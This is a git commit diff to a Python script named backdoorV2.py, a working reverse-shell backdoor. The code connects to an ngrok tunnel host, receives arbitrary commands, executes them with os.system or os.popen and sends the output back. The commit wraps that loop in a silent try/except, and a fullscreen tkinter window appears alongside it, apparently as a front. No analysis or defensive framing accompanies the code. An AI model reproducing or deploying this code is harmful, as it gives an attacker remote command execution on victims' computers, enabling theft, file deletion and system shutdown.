52504ae48650677c0ef7cd0d670a78d4bc4c003a
xrlp <56208895+xrlplerl@users.noreply.github.com>
2019-10-23 15:37:23 -0300

    v2.1

--- backdoorV2/backdoorV2.py
+++ backdoorV2/backdoorV2.py
@@ -2,18 +2,22 @@ from tkinter import *
 import socket,os
 
 def Inv():
-    port = 11914
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("0.tcp.ngrok.io",port))
-    caract  = ["cd","start","cls","MSG","shutdown","py","taskkill","del"]
-    while True:
-        msg = str(s.recv(1024).decode("utf-8"))
-        if((msg.split())[0] in caract):
-            os.system(msg)
-            s.sendall(b"[!]")
-        else:
-            msg = bytes((os.popen(msg)).read(),"utf-8")
-            s.sendall(msg)
+    try:
+        port = 11914
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("0.tcp.ngrok.io",port))
+        caract  = ["cd","start","cls","MSG","shutdown","py","taskkill","del"]
+        while True:
+            msg = str(s.recv(1024).decode("utf-8"))
+            if((msg.split())[0] in caract):
+                os.system(msg)
+                s.sendall(b"[!]")
+            else:
+                msg = bytes((os.popen(msg)).read(),"utf-8")
+                s.sendall(msg)
+                
+    except:
+        pass
 
 tela = Tk()
 tela.attributes("-fullscreen",True)
